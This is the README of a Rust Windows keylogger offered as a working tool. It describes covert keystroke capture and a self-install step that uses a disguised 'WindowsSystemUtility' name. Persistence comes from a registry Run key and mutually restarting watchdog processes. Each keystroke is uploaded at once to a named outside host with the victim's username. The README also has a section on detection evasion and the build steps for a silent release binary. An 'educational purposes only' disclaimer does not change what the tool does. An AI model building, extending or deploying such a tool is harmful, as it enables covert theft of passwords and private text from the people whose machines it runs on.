# Rust KeyLogger - Windowless Edition

A complete Windows keylogger written in Rust that runs silently in the background without any console window. This is a complete remake of the original C# Windows Forms keylogger project.

## Features

### Core Functionality
- **Windowless Execution**: No console or window appears when double-clicked (uses `#![windows_subsystem = "windows"]`)
- **Low-level Keyboard Monitoring**: Uses Windows GetKeyState API for reliable keystroke capture
- **Automatic Installation**: Self-installs to `%LOCALAPPDATA%\WindowsSystemUtility\WinSysUtils.exe`
- **Persistence**: Adds itself to Windows startup registry
- **Watchdog Process**: Automatically restarts if terminated
- **Real-time Upload**: Sends keystrokes immediately to remote API
- **Username Detection**: Uses Windows `%USERNAME%` environment variable

### Advanced Features
- **Self-Installation**: Copies itself to install location and deletes original
- **Process Monitoring**: Kills existing instances before installation
- **Watchdog System**: Creates randomized watchdog processes that monitor the main process
- **Registry Persistence**: Adds startup entry in `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
- **Silent Operation**: All processes run without windows or console output (in release mode)

## Architecture

### Process Structure
```
Original.exe
    ↓
    Copies to: %LOCALAPPDATA%\WindowsSystemUtility\WinSysUtils.exe
    ↓
WinSysUtils.exe (Main Process)
    ├── Keylogger Thread (captures keystrokes)
    ├── Watchdog Monitor Thread (checks watchdog every 2 seconds)
    └── HTTP Upload Thread (sends data to API)
    
123456789012.exe (Watchdog Process)
    └── Monitors WinSysUtils.exe, restarts if terminated
```

### Installation Flow
1. When first run from any location:
   - Creates `%LOCALAPPDATA%\WindowsSystemUtility\` directory
   - Kills any existing WinSysUtils processes
   - Copies itself to `WinSysUtils.exe`
   - Adds registry startup entry
   - Launches installed version
   - Deletes original file
   - Exits

2. When run from install location:
   - Starts watchdog process (12-digit random name)
   - Monitors watchdog health
   - Runs keylogger loop

## Building

### Prerequisites
- Rust toolchain (stable)
- Windows SDK (for MSVC linker)
- Visual Studio Build Tools with "Desktop development with C++"

### Build Commands

**Debug Build (with console for testing):**
```powershell
cargo build
```

**Release Build (no console window):**
```powershell
cargo build --release
```

The release build will:
- Compile as Windows GUI application (no console)
- Strip debug symbols
- Optimize for size (`opt-level = "z"`)
- Enable LTO for smaller binary

### Output
- Debug: `target\debug\RustKeyLogger.exe` (shows console)
- Release: `target\release\RustKeyLogger.exe` (no console, silent)

## Configuration

Edit constants in `src/main.rs`:

```rust
const API_URL: &str = "https://keylogger.delphigamerz.xyz/log";
const POLL_DELAY_MS: u64 = 10; // Keyboard polling interval
```

**Username is automatically detected** from `%USERNAME%` environment variable.

## Installation Paths

- **Install Directory**: `%LOCALAPPDATA%\WindowsSystemUtility\`
- **Main Executable**: `WinSysUtils.exe`
- **Watchdog Processes**: `{12-random-digits}.exe`
- **Registry Key**: `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinSysUtils`

## API Integration

### HTTP Request Format
```
POST https://keylogger.delphigamerz.xyz/log?username={USERNAME}
Content-Type: text/plain

{captured keystrokes}
```

### Behavior
- Sends keystrokes **immediately** (no buffering)
- Each keystroke is uploaded in real-time
- Silent failure on network errors (no retries)
- Uses `reqwest` blocking client with 10-second timeout

## Keystroke Capture

### Captured Keys
- **A-Z**: With proper Caps Lock and Shift handling
- **0-9**: With Shift for special characters (!, @, #, etc.)
- **Space, Enter**
- **Function Keys**: `<F1>` through `<F12>`
- **Special Keys**: `<Backspace>`, `<Delete>`, `<Insert>`

### Key Handling
- **Caps Lock + Shift**: XOR logic (proper behavior)
- **Edge Detection**: Only triggers on new press, not while held
- **Real-time Upload**: Each keystroke sent immediately

## Persistence Mechanisms

### 1. Registry Startup
Adds entry to Windows startup:
```
HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Name: WinSysUtils
Value: "%LOCALAPPDATA%\WindowsSystemUtility\WinSysUtils.exe"
```

### 2. Watchdog Process
- Creates copy with 12-digit random name (e.g., `847261950384.exe`)
- Runs with `--watchdog` argument
- Monitors main process every 1 second
- Restarts main process if terminated
- Main process monitors watchdog every 2 seconds and restarts if needed

### 3. Self-Installation
- Copies to install location
- Registers startup
- Deletes original
- Ensures only installed version runs

## Windows Subsystem Configuration

The application uses conditional compilation:

```rust
#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
```

- **Debug Mode**: Console window shows (for testing)
- **Release Mode**: No console window (silent background operation)

This matches the C# `WindowStyle = ProcessWindowStyle.Hidden` behavior.

## Process Management

### Killing Existing Instances
Uses Windows ToolHelp API to enumerate processes:
- Finds processes named "WinSysUtils" or "KeyLogger"
- Terminates matching processes
- Waits 500ms before proceeding

### Watchdog Detection
Searches for processes with:
- 12-digit numeric names
- Located in install directory
- Running continuously

## Security Considerations

⚠️ **WARNING**: This software is for educational purposes only.

### Legal Notice
- Unauthorized keylogging is illegal in most jurisdictions
- Always obtain proper authorization before deployment
- Use only for legitimate security testing or monitoring
- Respect privacy laws and regulations

### Detection Evasion (Educational)
- No console window in release builds
- Generic "Windows System Utility" name
- Runs from LocalAppData (typical for legitimate apps)
- Uses common Windows API calls
- Minimal CPU usage (10ms polling)

### Antivirus Considerations
This application will likely be flagged by antivirus software as a keylogger because:
- It captures keyboard input
- It has persistence mechanisms
- It communicates over HTTP
- It creates watchdog processes

## Uninstallation

To remove the keylogger:

1. **Kill Processes**:
```powershell
Get-Process | Where-Object {$_.Name -like "*WinSysUtils*"} | Stop-Process -Force
```

2. **Remove Files**:
```powershell
Remove-Item "$env:LOCALAPPDATA\WindowsSystemUtility" -Recurse -Force
```

3. **Remove Registry Entry**:
```powershell
Remove-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WinSysUtils"
```

4. **Kill Watchdog Processes**:
```powershell
# Watchdogs have 12-digit numeric names
Get-Process | Where-Object {$_.Name -match '^\d{12}$'} | Stop-Process -Force
```

## Comparison with C# Version

| Feature | C# Version | Rust Version |
|---------|-----------|--------------|
| Windowless | ✅ Windows Forms | ✅ `windows_subsystem` |
| Installation | ✅ LocalAppData | ✅ LocalAppData |
| Persistence | ✅ Registry | ✅ Registry |
| Watchdog | ✅ Random name | ✅ Random name |
| API Upload | ✅ HttpClient | ✅ reqwest |
| Binary Size | ~100KB | ~2-3MB |
| Memory Usage | Low | Very Low |
| CPU Usage | Low | Very Low |
| Caps Lock | ✅ XOR logic | ✅ XOR logic |

## Technical Details

### Dependencies
- **windows-sys**: Low-level Windows API bindings
- **reqwest**: HTTP client (blocking mode)
- **winreg**: Windows registry access
- **rand**: Random number generation for watchdog names

### Windows APIs Used
- `CreateToolhelp32Snapshot`: Process enumeration
- `Process32FirstW` / `Process32NextW`: Process iteration
- `OpenProcess` / `TerminateProcess`: Process control
- `GetKeyState`: Keyboard state checking
- Registry APIs: Startup persistence

### Build Configuration
```toml
[profile.release]
strip = false
opt-level = "z"      # Optimize for size
lto = true           # Link-time optimization
codegen-units = 1    # Single codegen unit for smaller binary
```

## Troubleshooting

### Console Window Appears
- Make sure you're running the **release build**: `cargo build --release`
- Verify `build.rs` is present and configured correctly
- Check that Visual Studio Build Tools are installed

### Doesn't Start on Boot
- Check registry entry exists
- Verify install path is correct
- Check Windows Event Viewer for errors

### Keystrokes Not Captured
- May require administrator privileges in some scenarios
- Check if running in VM or restricted environment
- Verify GetKeyState API availability

## Development Notes

### Testing in Debug Mode
Debug builds show console output for easier testing:
```powershell
cargo run
# Console will show activity
```

### Testing Installation
```powershell
# Build release version
cargo build --release

# Run from any location
.\target\release\RustKeyLogger.exe

# Check installation
dir "$env:LOCALAPPDATA\WindowsSystemUtility"
```

### Monitoring Processes
```powershell
# Watch for keylogger processes
Get-Process | Where-Object {$_.Name -like "*WinSys*" -or $_.Name -match '^\d{12}$'} | Format-Table Name, Id, Path
```

## License

Educational purposes only. Use responsibly and legally.

